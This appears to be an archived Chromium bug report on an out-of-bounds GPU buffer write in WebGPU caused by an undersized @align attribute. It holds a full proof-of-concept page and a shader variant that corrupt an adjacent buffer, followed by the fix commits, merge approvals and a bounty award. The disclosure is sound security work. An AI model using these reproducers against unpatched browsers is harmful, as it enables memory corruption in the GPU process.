# WebGPU: Out-of-bounds GPU buffer access caused by @align

| Field | Value |
|-------|-------|
| **Issue ID** | [375123371](https://issues.chromium.org/issues/375123371) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P0 |
| **Component** | Blink>WebGPU |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Chrome Version** | 130.0.6723.59 |
| **Reporter** | ap...@gmail.com |
| **Assignee** | jr...@google.com |
| **Created** | 2024-10-23 |
| **Bounty** | $35,000.00 |

## Description

# Steps to reproduce the problem

```
<script>
  globalThis.testRunner?.waitUntilDone();
  const log = globalThis.$vm?.print ?? console.log;

  onload = async () => {
    let adapter = await navigator.gpu.requestAdapter({});
    let device = await adapter.requestDevice({});
    device.pushErrorScope('validation');
    let storageBuffer = device.createBuffer({usage: GPUBufferUsage.STORAGE | GPUBufferUsage.COPY_DST | GPUBufferUsage.COPY_SRC, size: 256});
    let laterBuffer = device.createBuffer({usage: GPUBufferUsage.COPY_DST | GPUBufferUsage.COPY_SRC, size: 256});
    device.queue.writeBuffer(laterBuffer, 0, new Uint32Array([0x11223344]), 0, 1);
    await device.queue.onSubmittedWorkDone();

    let code = `
@group(0) @binding(0) var<storage, read_write> buf: array<S>;

struct S {
  @align(4)
  f0: vec4u,
  f1: u32,
}

@compute @workgroup_size(1)
fn c() {
  buf[8].f0 = vec4(0x12345678);
}
`;
    let module = device.createShaderModule({code});
    let bindGroupLayout = device.createBindGroupLayout({
      entries: [
        {binding: 0, buffer: {type: 'storage'}, visibility: GPUShaderStage.COMPUTE},
      ],
    });
    let computePipeline = device.createComputePipeline({layout: device.createPipelineLayout({bindGroupLayouts: [bindGroupLayout]}), compute: {module}});
    let commandEncoder = device.createCommandEncoder();
    let bindGroup0 = device.createBindGroup({
      layout: bindGroupLayout,
      entries: [
        {binding: 0, resource: {buffer: storageBuffer}},
      ],
    });
    let computePassEncoder = commandEncoder.beginComputePass({});
    computePassEncoder.setPipeline(computePipeline);
    computePassEncoder.setBindGroup(0, bindGroup0);
    computePassEncoder.dispatchWorkgroups(1);
    computePassEncoder.end();

    commandEncoder.clearBuffer(storageBuffer, 0);
    let outputBuffer = device.createBuffer({size: 16, usage: GPUBufferUsage.COPY_DST | GPUBufferUsage.MAP_READ});
    commandEncoder.copyBufferToBuffer(laterBuffer, 0, outputBuffer, 0, outputBuffer.size);
    let commandBuffer = commandEncoder.finish();
    device.queue.submit([commandBuffer]);
    await device.queue.onSubmittedWorkDone();
    await outputBuffer.mapAsync(GPUMapMode.READ);
    log([...new Uint32Array(outputBuffer.getMappedRange())].map(x => x.toString(0x10)));
    outputBuffer.unmap();
    let error = await device.popErrorScope();
    if (error) {
      log(error.message);
    } else {
      log('no validation error');
    }
    globalThis.testRunner?.notifyDone();
  };
</script>

```
# Problem Description

NOT A CONTRIBUTION: This report is provided for informational purposes and is not intended as a contribution. Any attached proof of concept code is provided under the MIT license. Where relevant, you may attribute this report to Apple Security Engineering and Architecture (SEAR).

Problem description

The Chrome implementation of WebGPU allows an invalid value for the @align attribute.

Allowing @align(n), where n is less than RequiredAlignOf(T,C) for the struct member this attribute is applied to, causes out-of-bounds read and write access on the GPU.

<https://gpuweb.github.io/gpuweb/wgsl/#align-attr>

According to the NOTE: regarding @align, the WebGPU specification says:

If align(n) is applied to a member of S with type T, and S is the store type or contained in the store type for a variable in address space C, then n must satisfy: n = k × RequiredAlignOf(T,C) for some positive integer k.

specifically "n must satisfy: n = k × RequiredAlignOf(T,C) for some positive integer k."

The following is presently allowed by Chrome on macOS, Version 130.0.6723.59 (Official Build) (arm64):

struct S {
@align(4)
f0: vec4u,
f1: u32,
}

RequiredAlignOf(vec4u, storage) is 16. Therefore @align(4) should be rejected on a struct member of type vec4u when that struct is used in address space storage.

Consequently, Chrome believes that one instance of S takes 20 bytes, whereas in reality it takes 32 bytes.

Further, the stride of the following array is 32 bytes, but Chrome believes it to be 20:

@group(0) @binding(0) var<storage, read\_write> buf: array<S>;

With a 256 byte buffer bound to buf, Chrome believes the runtime sized array above has length 12, and the following compute function will write outside the buffer:

@compute @workgroup\_size(1)
fn c() {
buf[8].f0 = vec4(0x12345678);
}

Index 8 is at offset 256 of the 256 byte buffer. The contents of laterBuffer immediately follow the contents of storageBuffer, causing the value 0x12345678 to be written into laterBuffer .

The test case prints the contents of laterBuffer, which should be 0x11223344 followed by zeroes, had they not been overwritten.

# Additional Comments

A test case was accidentally released to webkit <https://github.com/WebKit/WebKit/pull/35597>. We have updated it, but wanted to let you know it was accidentally leaked. Included is a md of the report too.

# Summary

WebGPU: Out-of-bounds GPU buffer access caused by @align

# Custom Questions

#### Reporter credit:

Apple Security Engineering and Architecture (SEAR).

# Additional Data

Category: Security   

Chrome Channel: Stable   

Regression: N/A

## Attachments

- [WebGPU, Out-of-bounds GPU buffer access caused by @align.pdf](attachments/WebGPU, Out-of-bounds GPU buffer access caused by @align.pdf) (application/pdf, 64.8 KB)

## Timeline

### za...@google.com (2024-10-24)

Hi jrprice@ we got a report from Apple related to @align.

I read through the bug and the doc, and here's what I think is happening. The Chrome implementation of WebGPU allows an invalid value for the @align attribute. It incorrectly allows the @align attribute to have a value smaller than the required alignment for a struct member in storage address space. This leads to Chrome miscalculating the struct's size and array stride, causing out-of-bounds memory access when a compute shader writes to the buffer.

But I would defer this to the team with the expertise in this area, can you please help take a look and see if your team would be the correct assignee. Thank you very much! 

### ad...@google.com (2024-10-24)

GPU folks: it would be helpful to know if this is (a) likely to be a cross-platform bug (b) whether we think it can be used for writes as well as reads. If both are true, we probably need to bump this to S0 due to the [limited GPU sandboxing on some platforms](https://chromium.googlesource.com/chromium/src/+/main/docs/security/process-sandboxes-by-platform.md).

### jr...@google.com (2024-10-24)

I've been able to modify the provided test case to exploit the issue using statically sized arrays as well (details below), which means this affects all platforms.

It can be used for both writes and reads (the reproducer provided in the original posts performs an OOB write).

I'll work on getting a fix up for review today.

The statically sized array case is very similar to the runtime-sized array case in the original report. We can choose an array element count of `12`, which causes Tint to incorrectly reflect the total size of the buffer as `20 * 12 = 240 bytes`. Dawn then allows us to bind a buffer of `256 bytes` to this buffer, even though it really needs `32 * 12 = 384 bytes`. Tint then elides bounds checking on the access at element `8` of the array, since `8 < 12`, and so the shader writes beyond the size of the buffer.

```
struct S {
  @align(4) a : vec4u,
  b : u32,
}

@group(0) @binding(0)
var<storage, read_write> buffer : array<S, 12>;

@compute @workgroup_size(1)
fn foo() {
  buffer[8].a = vec4(42);
}

```

### ad...@google.com (2024-10-24)

Thanks - with regret then, I'm bumping this up to S0.

### pe...@google.com (2024-10-24)

Setting milestone because of s0/s1 severity.

### ap...@google.com (2024-10-25)

Project: dawn  

Branch: main  

Author: James Price <[jrprice@google.com](mailto:jrprice@google.com)>  

Link:      <https://dawn-review.googlesource.com/212315>

[tint] Validate that `@align()` is large enough

---


Expand for full commit details
```
[tint] Validate that `@align()` is large enough 
 
Make sure that `n = k × RequiredAlignOf(T,C)` as per the spec, when 
`@align(n)` is applied to the member of a structure that is used in a 
host-shareable address space. 
 
Suppress some CTS tests until they are updated upstream. 
 
Fixed: 375123371 
Include-Ci-Only-Tests: true 
Change-Id: I3240b9ab0a42986e918a1c6a86268844861b9fed 
Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/212315 
Commit-Queue: James Price <jrprice@google.com> 
Reviewed-by: dan sinclair <dsinclair@chromium.org>

```

---

Files:

- M `src/tint/lang/wgsl/resolver/address_space_layout_validation_test.cc`
- M `src/tint/lang/wgsl/resolver/validator.cc`
- M `webgpu-cts/compat-expectations.txt`
- M `webgpu-cts/expectations.txt`

---

Hash: ed15f8542825f25131c5a186e7de3737d49d327e  

Date:  Fri Oct 25 01:29:12 2024


---

### pe...@google.com (2024-10-25)

Security Merge Request Consideration: This is sufficiently serious that it should be merged to stable. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M130. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request Consideration: This is sufficiently serious that it should be merged to beta. But I can't see a Chromium repo commit here,so you will need to investigate what - if anything - needs to be merged to M131. Is there a fix in some other repo which should be merged? Or, perhaps this ticket is a duplicate of some other ticket which has the real fix: please track that down and ensure it is merged appropriately.
Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request - Manual Review: Merge review required: no relevant commits could be automatically detected (via Git Watcher comments), sending to merge review for manual evaluation. If you have not already manually listed the relevant commits to be merged via a comment above, please do so ASAP.

Security Merge Request: Thank you for fixing this security bug! We aim to ship security fixes as quickly as possible, to limit their opportunity for exploitation as an "n-day" (that is, a bug where git fixes are developed into attacks before those fixes reach users).

We have determined this fix is necessary on milestone(s): [130, 131].

Please answer the following questions so that we can safely process this merge request:

1. Which CLs should be backmerged? (Please include Gerrit links.)
2. Has this fix been verified on Canary to not pose any stability regressions?
3. Does this fix pose any potential non-verifiable stability risks?
4. Does this fix pose any known compatibility risks?
5. Does it require manual verification by the test team? If so, please describe required testing.
6. (no answer required) Please check the OS custom field to ensure all impacted OSes are checked!

### pg...@google.com (2024-10-28)

Doing a last minute merge approval given the critical severity, and the release not being cut yet. Canary looks good - nothing relevant to be seen there.

Merge approved for M130! Please merge ASAP today morning to get this fix into the upcoming M130 stable respin!

Merge also approved for M131 - please merge at your earliest conveninence to get this fix into the next beta release

### ap...@google.com (2024-10-28)

Project: dawn  

Branch: chromium/6723  

Author: James Price <[jrprice@google.com](mailto:jrprice@google.com)>  

Link:      <https://dawn-review.googlesource.com/212714>

[tint] Validate that `@align()` is large enough

---


Expand for full commit details
```
[tint] Validate that `@align()` is large enough 
 
Make sure that `n = k × RequiredAlignOf(T,C)` as per the spec, when 
`@align(n)` is applied to the member of a structure that is used in a 
host-shareable address space. 
 
Suppress some CTS tests until they are updated upstream. 
 
Fixed: 375123371 
Include-Ci-Only-Tests: true 
Change-Id: I3240b9ab0a42986e918a1c6a86268844861b9fed 
Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/212315 
Commit-Queue: James Price <jrprice@google.com> 
Reviewed-by: dan sinclair <dsinclair@chromium.org> 
(cherry picked from commit ed15f8542825f25131c5a186e7de3737d49d327e) 
Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/212714 
Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
Auto-Submit: James Price <jrprice@google.com> 
Commit-Queue: Alan Baker <alanbaker@google.com> 
Reviewed-by: Alan Baker <alanbaker@google.com>

```

---

Files:

- M `src/tint/lang/wgsl/resolver/address_space_layout_validation_test.cc`
- M `src/tint/lang/wgsl/resolver/validator.cc`
- M `webgpu-cts/compat-expectations.txt`
- M `webgpu-cts/expectations.txt`

---

Hash: 70a01d28c3ecd75b67a87e4643bd4d55fc391ce6  

Date:  Mon Oct 28 16:57:46 2024


---

### ap...@google.com (2024-10-28)

Project: dawn  

Branch: chromium/6778  

Author: James Price <[jrprice@google.com](mailto:jrprice@google.com)>  

Link:      <https://dawn-review.googlesource.com/212734>

[tint] Validate that `@align()` is large enough

---


Expand for full commit details
```
[tint] Validate that `@align()` is large enough 
 
Make sure that `n = k × RequiredAlignOf(T,C)` as per the spec, when 
`@align(n)` is applied to the member of a structure that is used in a 
host-shareable address space. 
 
Suppress some CTS tests until they are updated upstream. 
 
Fixed: 375123371 
Include-Ci-Only-Tests: true 
Change-Id: I3240b9ab0a42986e918a1c6a86268844861b9fed 
Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/212315 
Commit-Queue: James Price <jrprice@google.com> 
Reviewed-by: dan sinclair <dsinclair@chromium.org> 
(cherry picked from commit ed15f8542825f25131c5a186e7de3737d49d327e) 
Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/212734 
Auto-Submit: James Price <jrprice@google.com> 
Reviewed-by: Alan Baker <alanbaker@google.com> 
Reviewed-by: Corentin Wallez <cwallez@chromium.org> 
Commit-Queue: Alan Baker <alanbaker@google.com>

```

---

Files:

- M `src/tint/lang/wgsl/resolver/address_space_layout_validation_test.cc`
- M `src/tint/lang/wgsl/resolver/validator.cc`
- M `webgpu-cts/compat-expectations.txt`
- M `webgpu-cts/expectations.txt`

---

Hash: cdc5b4dc1ee1482378b545b6c1efa1a234195ab5  

Date:  Mon Oct 28 16:59:39 2024


---

### pe...@google.com (2024-10-28)

LTS Milestone M126

This issue has been flagged as a merge candidate for Chrome OS' LTS channel. If selected, our merge team will handle any additional merges. To help us determine if this issue requires a merge to LTS, please answer this short questionnaire:

1. Was this issue a regression for the milestone it was found in?
2. Is this issue related to a change or feature merged after the latest LTS Milestone?

### jr...@google.com (2024-10-28)

Merges for M130 and M131 are now complete.

Responses to the ChromeOS LTS questionnaire:

1. Was this issue a regression for the milestone it was found in?

```
No. The security issue has been present for many releases.

```

2. Is this issue related to a change or feature merged after the latest LTS Milestone?

```
No, as above, the issue was present long before M126.

```

### pe...@google.com (2024-10-30)

This issue requires additional review before it can be merged to the LTS channel. Please answer the following questions to help us evaluate this merge:

1. Number of CLs needed for this fix and links to them.
2. Level of complexity (High, Medium, Low - Explain)
3. Has this been merged to a stable release? beta release?
4. Overall Recommendation (Yes, No)

### qk...@google.com (2024-10-30)

1. https://dawn-review.googlesource.com/c/dawn/+/212874
2. Low, there is one conflict in the TestExpectation file.
3. 130, 131
4. Yes, as mentioned in the comment #13, the issue was present long before M126.

### ap...@google.com (2024-11-01)

Project: dawn  

Branch: chromium/6478  

Author: James Price <[jrprice@google.com](mailto:jrprice@google.com)>  

Link:      <https://dawn-review.googlesource.com/212874>

[M126-LTS][tint] Validate that `@align()` is large enough

---


Expand for full commit details
```
[M126-LTS][tint] Validate that `@align()` is large enough 
 
Make sure that `n = k × RequiredAlignOf(T,C)` as per the spec, when 
`@align(n)` is applied to the member of a structure that is used in a 
host-shareable address space. 
 
Suppress some CTS tests until they are updated upstream. 
 
Fixed: 375123371 
Include-Ci-Only-Tests: true 
Change-Id: I3240b9ab0a42986e918a1c6a86268844861b9fed 
Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/212315 
Commit-Queue: James Price <jrprice@google.com> 
Reviewed-by: dan sinclair <dsinclair@chromium.org> 
(cherry picked from commit ed15f8542825f25131c5a186e7de3737d49d327e) 
Reviewed-on: https://dawn-review.googlesource.com/c/dawn/+/212874 
Reviewed-by: James Price <jrprice@google.com> 
Reviewed-by: Gyuyoung Kim (xWF) <qkim@google.com> 
Reviewed-by: Victor-Gabriel Savu <vsavu@google.com>

```

---

Files:

- M `src/tint/lang/wgsl/resolver/address_space_layout_validation_test.cc`
- M `src/tint/lang/wgsl/resolver/validator.cc`
- M `webgpu-cts/compat-expectations.txt`
- M `webgpu-cts/expectations.txt`

---

Hash: 1eaa73d0f73a2967b91e59fea5c201d1f87cb448  

Date:  Fri Nov 01 13:03:40 2024


---

### sp...@google.com (2024-11-08)

** NOTE: This is an automatically generated email **

Hello,

Congratulations! The Chrome Vulnerability Rewards Program (VRP) Panel has decided to award you $35000.00 for this report.

Rationale for this decision:
report of demonstrated memory corruption in a non-sandboxed process -- GPU process in Chrome on Android platform


Important: If you aren't already registered with Google as a supplier, p2p-vrp@google.com will reach out to you. If you have registered in the past, no need to repeat the process – you can sit back and relax, and we will process the payment soon.

If you have any payment related requests, please direct them to p2p-vrp@google.com. Please remember to include the subject of this email and the email address that the report was sent from.


Thank you for your efforts and helping us make Chrome more secure for all users!

Cheers,
Chrome VRP Panel Bot


P.S. One other thing we'd like to mention:

* Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.
Please contact security-vrp@chromium.org with any questions.

### am...@chromium.org (2024-11-08)

Congratulations and thank you Apple Product Security and SEAR teams! Thank you for your efforts and reporting this issue to us. If you would like to donate this reward, please let us know and we'll reach out off bug with donation information.

### ap...@gmail.com (2024-11-19)

We appreciate the bounty award. The engineer who found the issue requests that the bounty funds are donated to Mutual Aid Disaster Relief Inc.

### am...@chromium.org (2024-11-19)

Thanks for the response! $70,000 has now been donated to Mutual Aid Disaster Relief Inc.

### pe...@google.com (2025-02-01)

This bug has been closed for more than 14 weeks. Removing issue access restrictions.

## Bounty Award

> report of demonstrated memory corruption in a non-sandboxed process -- GPU process in Chrome on Android platform

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/375123371)*
